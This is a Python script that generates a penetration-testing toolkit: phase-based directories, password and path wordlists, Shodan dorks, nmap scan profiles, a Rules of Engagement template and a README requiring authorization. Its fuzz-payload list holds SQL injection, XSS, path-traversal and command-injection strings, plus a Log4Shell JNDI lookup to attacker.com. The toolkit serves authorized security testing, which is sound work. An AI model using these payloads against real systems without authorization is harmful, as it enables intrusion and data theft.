#!/usr/bin/env python3
"""
JAKAL Phase 2B: GACyber Tool Kit Generator
Creates complete directory structure and wordlists
"""

import os
import json
from pathlib import Path

def create_gacyber_toolkit():
    """Create complete GACyber Tool Kit directory structure with wordlists."""
    
    base_path = Path("GACyber_Tool_Kit")
    
    # Define directory structure
    directories = [
        "01-Reconnaissance/OSINT",
        "01-Reconnaissance/DNS",
        "01-Reconnaissance/Network_Mapping",
        "02-Scanning/Nmap",
        "02-Scanning/Nuclei",
        "02-Scanning/Sn1per",
        "03-Enumeration/Service_Enumeration",
        "03-Enumeration/Version_Detection",
        "03-Enumeration/User_Enumeration",
        "04-Web-Application/Nikto",
        "04-Web-Application/SQLMap",
        "04-Web-Application/Gobuster_FFUF",
        "04-Web-Application/Burp_Suite",
        "04-Web-Application/Web_Vulnerability_Templates",
        "05-Wireless/Aircrack-ng",
        "05-Wireless/Wireless_Enum",
        "05-Wireless/CheatSheets",
        "06-Exploitation/Metasploit",
        "06-Exploitation/Custom_Exploits",
        "06-Exploitation/Payload_Generation",
        "06-Exploitation/Human_in_the_Loop_Staging",
        "07-Post-Exploitation/Persistence",
        "07-Post-Exploitation/Privilege_Escalation",
        "07-Post-Exploitation/Lateral_Movement",
        "07-Post-Exploitation/Data_Exfiltration",
        "07-Post-Exploitation/CheatSheets",
        "Resources/Wordlists",
        "Resources/Targets",
        "Resources/Payloads",
        "Resources/Tools_Manifest",
        "Resources/Templates",
        "Resources/CVE_Database",
        "CheatSheets",
        "Documentation"
    ]
    
    # Create directories
    for directory in directories:
        path = base_path / directory
        path.mkdir(parents=True, exist_ok=True)
    
    # Define wordlists
    wordlists = {
        "Resources/Wordlists/common_passwords.txt": [
            "admin", "password", "123456", "12345678", "qwerty", "abc123",
            "letmein", "welcome", "monkey", "dragon", "master", "sunshine",
            "princess", "football", "batman", "superman", "shadow", "michael",
            "123123", "password123", "admin123", "passpass", "pass123",
            "123456789", "12345", "1234", "1234567", "iloveyou", "trustno1",
            "hello", "freedom", "whatever", "qazwsx", "starwars", "cookie",
            "12341234", "123123123", "passwd", "test", "guest", "oracle",
            "root", "toor", "sql", "mysql", "admin@123", "changeme",
            "P@ssw0rd", "Summer2024", "Winter2024", "Spring2024", "Fall2024"
        ] + [f"pass{i}" for i in range(1, 100)] + [f"test{i}" for i in range(1, 100)],
        
        "Resources/Wordlists/directories.txt": [
            "admin", "administrator", "login", "wp-admin", "phpmyadmin", "cpanel",
            "cms", "portal", "dashboard", "controlpanel", "webmail", "mail",
            "blog", "test", "backup", "backups", "config", "tmp", "temp",
            "upload", "uploads", "files", "images", "assets", "js", "css",
            "includes", "inc", "private", "secure", "restricted", "hidden",
            "web", "public", "app", "api", "v1", "v2", "admin_area",
            ".git", ".env", ".htaccess", "web.config", "robots.txt",
            "sitemap.xml", "index.html", "index.php", "default.asp",
            "login.php", "admin.php", "user", "users", "account", "accounts",
            "profile", "settings", "download", "downloads", "document", "documents"
        ] + [f"admin{i}" for i in range(1, 20)] + [f"test{i}" for i in range(1, 20)],
        
        "Resources/Wordlists/subdomains.txt": [
            "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop",
            "ns1", "ns2", "ns3", "ns4", "admin", "mx", "test", "dev",
            "staging", "beta", "api", "shop", "store", "blog", "forum",
            "news", "app", "mobile", "secure", "vpn", "remote", "intranet",
            "backup", "monitor", "manage", "console", "control", "web",
            "server", "gateway", "dns", "mail2", "exchange", "mysql",
            "postgres", "redis", "ldap", "admin-panel", "cp", "phpmyadmin",
            "webdisk", "autodiscover", "autoconfig", "mail-relay"
        ] + [f"sub{i}" for i in range(1, 30)],
        
        "Resources/Wordlists/extensions.txt": [
            "php", "asp", "jsp", "aspx", "html", "htm", "js", "css",
            "xml", "json", "txt", "pdf", "doc", "docx", "xls", "xlsx",
            "zip", "rar", "tar", "gz", "sql", "db", "bak", "backup",
            "old", "config", "conf", "cfg", "ini", "log", "exe", "dll",
            "so", "jar", "war", "ear", "class", "pyc", "rb", "sh",
            "bat", "cmd", "ps1", "vbs", "pl", "py", "node"
        ],
        
        "Resources/Wordlists/api_endpoints.txt": [
            "/api/users", "/api/login", "/api/auth", "/api/profile",
            "/api/data", "/api/v1", "/api/v2", "/api/admin",
            "/api/settings", "/api/config", "/api/status", "/api/health",
            "/api/info", "/api/about", "/api/version", "/api/search",
            "/api/list", "/api/get", "/api/post", "/api/put", "/api/delete",
            "/rest/", "/graphql", "/soap", "/rpc", "/webhook",
            "/callback", "/notify", "/upload", "/download",
            "/export", "/import", "/backup", "/restore", "/sync"
        ] + [f"/api/endpoint{i}" for i in range(1, 50)],
        
        "Resources/Wordlists/parameters.txt": [
            "id", "user", "username", "email", "password", "name",
            "title", "description", "query", "search", "filter",
            "sort", "order", "limit", "offset", "page", "size",
            "token", "auth", "session", "cookie", "key", "secret",
            "api_key", "access_token", "refresh_token", "user_id",
            "admin", "role", "permission", "scope", "action", "method",
            "file", "upload", "download", "export", "import", "format",
            "output", "callback", "redirect", "url", "path", "proxy"
        ],
        
        "Resources/Wordlists/fuzz_payloads.txt": [
            "' OR '1'='1", "' OR 1=1--", "admin' --", "' UNION SELECT NULL--",
            "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>", "\"><script>alert('XSS')</script>",
            "'; DROP TABLE users--", "1' AND '1'='1", "' AND 1=1--",
            "../../../etc/passwd", "..\\..\\..\\windows\\system32",
            "${jndi:ldap://attacker.com/a}", "${IFS}cat${IFS}/etc/passwd",
            "`cat /etc/passwd`", "$(cat /etc/passwd)", "${7*7}",
            "{{7*7}}", "{#{7*7}}", "#{7*7}", "TEMPLATE_INJECTION",
            "../../", "..%2f..%2f", "..%252f", "....//", "..;/",
            "%00", "%0a", "%0d", "%1a", "\\x00", "\\n", "\\r"
        ],
    }
    
    # Create wordlist files
    for wordlist_path, words in wordlists.items():
        file_path = base_path / wordlist_path
        file_path.parent.mkdir(parents=True, exist_ok=True)
        with open(file_path, 'w') as f:
            f.write('\n'.join(set(words)))  # Remove duplicates
        print(f"✅ Created {wordlist_path} ({len(set(words))} entries)")
    
    # Create Shodan dorks file
    shodan_dorks = [
        'port:80 country:"US"',
        'port:443 title:"Login"',
        '"Authentication: Basic" port:80',
        'port:3389 os:"Windows"',
        'port:22 "SSH"',
        'port:445 "SMB"',
        'port:3306 "MySQL"',
        'port:5432 "PostgreSQL"',
        'port:6379 "Redis"',
        'port:27017 "MongoDB"',
        'port:9200 "Elasticsearch"',
        'port:5900 "VNC"',
        'port:8080 "Apache"',
        'port:8000 "Python"',
        'title:"Default" manufacturer:"Apache"',
        'html:"powered by"',
        'server:"Microsoft-IIS"',
        'server:"nginx"',
        'server:"Apache"',
        '"X-Powered-By:"',
        'ssl.cert.issuer:"Let\'s Encrypt"',
        'ssl.cert.expired:true',
        'vuln:CVE-2024',
    ]
    
    shodan_path = base_path / "01-Reconnaissance/OSINT/shodan_dorks.txt"
    with open(shodan_path, 'w') as f:
        f.write('\n'.join(shodan_dorks))
    print(f"✅ Created shodan_dorks.txt ({len(shodan_dorks)} dorks)")
    
    # Create nmap profiles
    nmap_profiles = {
        "quick": {
            "description": "Quick scan of top 1000 ports",
            "command": "nmap -T4 -F {target}",
            "time_estimate": "1-2 minutes"
        },
        "comprehensive": {
            "description": "Full scan with service detection and OS fingerprinting",
            "command": "nmap -sV -sC -O -T4 -p- {target}",
            "time_estimate": "30-60 minutes"
        },
        "stealth": {
            "description": "Slow, stealthy scan to avoid detection",
            "command": "nmap -sS -T1 -p- {target}",
            "time_estimate": "2-4 hours"
        },
        "udp": {
            "description": "UDP port scan",
            "command": "nmap -sU -T4 {target}",
            "time_estimate": "5-15 minutes"
        },
        "aggressive": {
            "description": "Aggressive scan with aggressive timing",
            "command": "nmap -A -T4 {target}",
            "time_estimate": "10-30 minutes"
        }
    }
    
    nmap_path = base_path / "02-Scanning/Nmap/nmap_profiles.json"
    with open(nmap_path, 'w') as f:
        json.dump(nmap_profiles, f, indent=2)
    print(f"✅ Created nmap_profiles.json")
    
    # Create Nuclei templates reference
    nuclei_templates = """# Nuclei Security Templates Reference
# Location: Use with nuclei -t <template_path>

## Common Categories:
- Vulnerabilities (CVE-based)
- Misconfigurations (Default configs, exposed panels)
- Technology Detection (Identify versions and tech stacks)
- DNS (Zone transfers, DNS spoofing)
- HTTP (Auth bypass, CORS, XXE, SSRF)
- Network (Port scanning, service detection)
- SSL (Certificate validation, weak ciphers)
- Web (SQLi, XSS, CSRF, LFI, RFI)

## Installation:
nuclei -update-templates

## Common Usage:
nuclei -list                          # List all templates
nuclei -u https://target.com          # Basic scan
nuclei -u https://target.com -t cves/ # CVE scanning
nuclei -u https://target.com -s critical,high  # Filter by severity

## Key Templates:
- cves/CVE-XXXX-XXXXX.yaml
- misconfigurations/
- technologies/
- dns/
- http/
- ssl/
- web/
"""
    
    nuclei_path = base_path / "02-Scanning/Nuclei/nuclei_templates_guide.md"
    with open(nuclei_path, 'w') as f:
        f.write(nuclei_templates)
    print(f"✅ Created nuclei_templates_guide.md")
    
    # Create Tools Manifest
    tools_manifest = {
        "tools": {
            "nmap": {
                "version": "7.94+",
                "arch": ["x86", "ARM"],
                "installed": False,
                "install_cmd": "apt-get install nmap",
                "download_url": "https://nmap.org/download.html"
            },
            "nikto": {
                "version": "2.1.6+",
                "arch": ["x86", "ARM"],
                "installed": False,
                "install_cmd": "apt-get install nikto",
                "download_url": "https://github.com/sullo/nikto"
            },
            "nuclei": {
                "version": "3.0+",
                "arch": ["x86", "ARM"],
                "installed": False,
                "install_cmd": "apt-get install nuclei",
                "download_url": "https://github.com/projectdiscovery/nuclei"
            },
            "sqlmap": {
                "version": "1.8+",
                "arch": ["x86", "ARM"],
                "installed": False,
                "install_cmd": "apt-get install sqlmap",
                "download_url": "https://github.com/sqlmapproject/sqlmap"
            },
            "gobuster": {
                "version": "3.6+",
                "arch": ["x86", "ARM"],
                "installed": False,
                "install_cmd": "apt-get install gobuster",
                "download_url": "https://github.com/OJ/gobuster"
            },
            "metasploit": {
                "version": "6.3+",
                "arch": ["x86", "ARM"],
                "installed": False,
                "install_cmd": "apt-get install metasploit-framework",
                "download_url": "https://www.metasploit.com"
            },
            "aircrack-ng": {
                "version": "1.6+",
                "arch": ["x86", "ARM"],
                "installed": False,
                "install_cmd": "apt-get install aircrack-ng",
                "download_url": "https://www.aircrack-ng.org/"
            }
        }
    }
    
    tools_path = base_path / "Resources/Tools_Manifest/tools_manifest.json"
    with open(tools_path, 'w') as f:
        json.dump(tools_manifest, f, indent=2)
    print(f"✅ Created tools_manifest.json")
    
    # Create scope template
    scope_template = """# Rules of Engagement (RoE) Template

## Authorization
- **Client Name:** [Client Name]
- **Start Date:** [Start Date]
- **End Date:** [End Date]
- **Authorized By:** [Name & Email]

## Scope - AUTHORIZED TARGETS
### IP Ranges (CIDR notation)
- 192.168.1.0/24
- 10.0.0.0/8

### Domains
- example.com
- *.example.com

## EXCLUDED TARGETS (Do NOT Test)
### IP Ranges
- [Exclude critical systems]

### Domains
- [Exclude production databases]

## Testing Methods AUTHORIZED
- [ ] Network Scanning
- [ ] Web Application Testing
- [ ] Social Engineering
- [ ] Physical Security
- [ ] Wireless Testing

## Testing Methods PROHIBITED
- [ ] Denial of Service (DoS)
- [ ] Destructive Testing
- [ ] Production Data Exfiltration
- [ ] Service Disruption

## Rules
1. Testing only during agreed times
2. No data destruction
3. Minimal disruption
4. Report all findings immediately
5. No unauthorized access to admin panels
6. Remediation testing only after approval

## Contacts
- **Client Technical Contact:** [Name & Email]
- **Client Legal Contact:** [Name & Email]
- **Tester Lead:** [Name & Email]

## Insurance
- **Policy Number:** [Policy #]
- **Provider:** [Insurance Co]
- **Coverage Amount:** [Amount]
- **Expiry Date:** [Date]

**Signed:** ___________________  **Date:** ___________
"""
    
    scope_path = base_path / "Resources/Templates/RoE_template.txt"
    with open(scope_path, 'w') as f:
        f.write(scope_template)
    print(f"✅ Created RoE_template.txt")
    
    # Create README files
    readme = """# JAKAL GACyber Tool Kit

Complete penetration testing toolkit organized by CPENT phases.

## Directory Structure

### 01-Reconnaissance
Passive information gathering
- OSINT (Shodan, Google dorks, registrar lookups)
- DNS enumeration (zone transfers, subdomain discovery)
- Network mapping (traceroute, IP ranges)

### 02-Scanning
Active scanning and service discovery
- Nmap profiles (quick, comprehensive, stealth, UDP)
- Nuclei vulnerability templates
- Sn1per automated scanning

### 03-Enumeration
Service enumeration and version detection
- SMB, SNMP, LDAP enumeration
- Default credentials testing
- Service fingerprinting

### 04-Web-Application
Web application testing
- Directory brute-forcing
- SQL injection testing
- XSS/CSRF detection
- Burp Suite automation

### 05-Wireless
Wireless network testing
- WiFi scanning and enumeration
- WPA/WEP cracking preparation
- Rogue AP detection

### 06-Exploitation
Exploitation framework
- Metasploit module selection
- Custom exploit templates
- Payload generation (reverse shells, web shells)

### 07-Post-Exploitation
Post-exploitation activities
- Persistence mechanisms
- Privilege escalation
- Lateral movement
- Data exfiltration

### Resources
- **Wordlists** (passwords, directories, subdomains, payloads)
- **Targets** (authorized targets list)
- **Payloads** (reverse shells, encoding techniques)
- **Templates** (RoE, assessment, RFP templates)
- **CVE Database** (vulnerability references)

### CheatSheets
Quick reference guides for all CPENT phases

## Authorization Requirement

**ALL TESTING REQUIRES:**
1. ✅ Written Rules of Engagement (RoE)
2. ✅ Defined scope (authorized targets)
3. ✅ Active insurance policy
4. ✅ Operator approval

**NEVER test without authorization.**

## Usage

Every tool wrapper calls the authorization gate:

```python
auth_gate.check_authorization_and_scope(target, action, operator_id)
```

If check fails → action is BLOCKED and logged.

## Next Steps

1. Review RoE template (Resources/Templates/)
2. Fill in authorized targets
3. Verify insurance coverage
4. Start Phase 3 security agents
"""
    
    readme_path = base_path / "README.md"
    with open(readme_path, 'w') as f:
        f.write(readme)
    print(f"✅ Created README.md")
    
    print(f"\n✅ GACyber Tool Kit structure created successfully!")
    print(f"📁 Location: {base_path.absolute()}")
    print(f"📊 Directories: {len(directories)}")
    print(f"📝 Wordlists: {len(wordlists)}")

if __name__ == "__main__":
    create_gacyber_toolkit()
